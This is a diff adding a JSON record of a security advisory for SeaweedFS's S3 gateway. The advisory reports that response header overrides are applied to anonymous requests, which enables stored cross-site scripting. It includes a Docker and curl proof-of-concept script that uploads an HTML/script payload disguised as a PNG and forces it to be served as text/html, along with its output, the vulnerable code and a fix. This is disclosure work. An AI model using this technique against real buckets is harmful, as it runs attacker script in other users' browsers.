@@ -1,0 +1,47 @@
+{
+  "global": null,
+  "id": "GHSA-54j8-2gxc-wr9h",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-79",
+      "CWE-863"
+    ],
+    "description": "### Summary\r\n\r\nThe S3 gateway applies the GetObject response header overrides (`response-content-type`, `response-content-disposition`, `response-content-encoding` and the other `response-*` query parameters) to **unsigned, anonymous** requests. Amazon S3 forbids this: *\"When you use these parameters, you must sign the request by using either an Authorization header or a presigned URL. These parameters cannot be used with an unsigned (anonymous) request.\"* (GetObject API reference).\r\n\r\nAnyone who can read an object anonymously can therefore choose how it is served. An object stored as `image/png` whose bytes contain HTML is served as an inline `text/html` page, which the browser renders and runs.\r\n\r\n### Details\r\n\r\nAt tag 4.47 (commit `c507336`), `setResponseHeaders()` in `weed/s3api/s3api_object_handlers.go` (lines 2254-2263) copies every query parameter listed in `s3_constants.PassThroughHeaders` (`weed/s3api/s3_constants/header.go:304`) into the response headers. It does not check how the request was authenticated:\r\n\r\n```go\r\n// Apply S3 passthrough headers from query parameters\r\n// ...\r\n// This allows presigned URLs to control how browsers handle the downloaded content\r\nif r != nil {\r\n\tfor queryParam, headerValue := range r.URL.Query() {\r\n\t\tif normalizedHeader, ok := s3_constants.PassThroughHeaders[strings.ToLower(queryParam)]; ok && len(headerValue) > 0 && headerValue[0] != \"\" {\r\n\t\t\tw.Header().Set(normalizedHeader, headerValue[0])\r\n\t\t}\r\n\t}\r\n}\r\n```\r\n\r\nThe comment states that the feature is meant for presigned URLs, but anonymous requests reach it too. A minimal fix is to skip the loop for anonymous requests, which the gateway can already detect (`getRequestAuthType(r) == authTypeAnonymous`, used in `s3api_server.go` and `s3api_bucket_handlers.go`):\r\n\r\n```go\r\nif r != nil && getRequestAuthType(r) != authTypeAnonymous {\r\n```\r\n\r\nReturning 403 instead would also match AWS behaviour.\r\n\r\nSub-resources are correctly refused to anonymous callers (`?acl`, `?policy`, `?cors`, `?versioning` and listing return 403). Only the response overrides are accepted.\r\n\r\n### PoC\r\n\r\nDeployment: stock `chrislusf/seaweedfs:4.47` image (index digest `sha256:ce9e796f1fe6f06968f4c04bdaf8f678dad9c8acdfef3d244133d71bfa6bf882`), `weed server -s3` with its default configuration and one admin identity (`AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`), so anonymous access is denied by default. The attacker reaches only the S3 port, with no credentials.\r\n\r\nThe script below needs only Docker (curl runs in a container) and cleans up after itself. It does the following:\r\n\r\n1. Starts the server.\r\n2. Creates bucket `assets` with a standard bucket policy granting `s3:GetObject` on `assets/*` to `Principal: *`. This is the usual set-up for a bucket of public assets served to browsers.\r\n3. As the admin, uploads `avatar.png` with `Content-Type: image/png` and the body `<html><script>alert(document.domain)</script></html>`.\r\n4. Reads the object anonymously, with and without overrides.\r\n\r\n```bash\r\n#!/usr/bin/env bash\r\n# Minimal reproduction: SeaweedFS honours S3 response header overrides on anonymous requests.\r\n# Needs docker and curl >= 7.75 (for --aws-sigv4). Cleans up after itself.\r\nset -euo pipefail\r\n\r\nIMAGE=\"${IMAGE:-chrislusf/seaweedfs:4.47}\"\r\nKEY=reproadmin\r\nSECRET=reproadmin\r\nNET=swfs-repro\r\nS3=http://s3:8333\r\n\r\ndocker network create \"$NET\" >/dev/null\r\ncleanup() { docker rm -f s3 >/dev/null 2>&1 || true; docker network rm \"$NET\" >/dev/null 2>&1 || true; }\r\ntrap cleanup EXIT\r\n\r\n# Stock server, S3 gateway with one admin identity (anonymous access is denied by default).\r\ndocker run -d --name s3 --network \"$NET\" -e AWS_ACCESS_KEY_ID=\"$KEY\" -e AWS_SECRET_ACCESS_KEY=\"$SECRET\" \\\r\n    \"$IMAGE\" server -s3 >/dev/null\r\n\r\nc() { docker run --rm --network \"$NET\" curlimages/curl:8.10.1 \"$@\"; }\r\nsigned=(--aws-sigv4 \"aws:amz:us-east-1:s3\" --user \"$KEY:$SECRET\" -H \"x-amz-content-sha256: UNSIGNED-PAYLOAD\")\r\n\r\nuntil c -fs \"$S3/healthz\" >/dev/null 2>&1; do sleep 1; done\r\nsleep 3\r\n\r\n# 1. A bucket whose objects are readable anonymously (GetObject only), as for any public assets bucket.\r\nc -fs \"${signed[@]}\" -X PUT \"$S3/assets\" >/dev/null\r\nc -fs \"${signed[@]}\" -X PUT \"$S3/assets?policy\" --data '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":[\"*\"]},\"Action\":[\"s3:GetObject\"],\"Resource\":[\"arn:aws:s3:::assets/*\"]}]}' >/dev/null\r\n\r\n# 2. An object stored as an image, whose bytes contain HTML (e.g. a polyglot uploaded by a user).\r\nc -fs \"${signed[@]}\" -X PUT -H \"Content-Type: image/png\" --data '<html><script>alert(document.domain)</script></html>' \"$S3/assets/avatar.png\" >/dev/null\r\n\r\necho \"== Anonymous GET, no override (expected: image/png)\"\r\nc -s -o /dev/null -D - \"$S3/assets/avatar.png\" | grep -i -E '^(HTTP|content-type|content-disposition)'\r\n\r\necho \"== Anonymous GET with response-content-type=text/html (expected: 403 or image/png; AWS rejects unsigned overrides)\"\r\nc -s -o /dev/null -D - \"$S3/assets/avatar.png?response-content-type=text/html&response-content-disposition=inline\" | grep -i -E '^(HTTP|content-type|content-disposition)'\r\n```\r\n\r\nOutput:\r\n\r\n```\r\n== Anonymous GET, no override (expected: image/png)\r\nHTTP/1.1 200 OK\r\nContent-Type: image/png\r\n== Anonymous GET with response-content-type=text/html (expected: 403 or image/png; AWS rejects unsigned overrides)\r\nHTTP/1.1 200 OK\r\nContent-Disposition: inline\r\nContent-Type: text/html\r\n```\r\n\r\nExpected (Amazon S3): the anonymous request carrying `response-*` parameters is rejected, or the parameters are ignored and the stored headers are served. Actual: the overrides are applied.\r\n\r\n### Impact\r\n\r\nThis is stored cross-site scripting through an authorization flaw.\r\n\r\n- The bucket policy grants anonymous **read** only, and the owner stored the object with a safe `Content-Type`. An unauthenticated client can still rewrite the headers the object is served with, turning stored data into active HTML.\r\n- This matters wherever an anonymously readable bucket holds attacker-influenced content, which is the common case of user uploads (avatars, listing images, attachments). Polyglot image/HTML files pass extension, declared-type and image-header checks.\r\n- When the bucket is served from the application's own domain, the injected script runs with that origin's cookies and DOM, against every user who opens the crafted link. A reverse proxy mapping `/public/` to the bucket is a common set-up.\r\n- `response-content-encoding` can also be forced, which corrupts or disguises content served to other users.\r\n\r\nMitigation until a fix: a reverse proxy in front of the public bucket can drop the query string and add `X-Content-Type-Options: nosniff`.\r\n",
+    "ghsa_id": "GHSA-54j8-2gxc-wr9h",
+    "html_url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-54j8-2gxc-wr9h",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-54j8-2gxc-wr9h"
+      }
+    ],
+    "published_at": "2026-11-09T19:52:41Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "S3 gateway applies response header overrides (response-content-type, response-content-disposition) to anonymous requests, enabling stored XSS on publicly readable buckets",
+    "updated_at": "2026-11-09T19:52:41Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/seaweedfs/seaweedfs"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 4.47"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "seaweedfs/seaweedfs"
+}
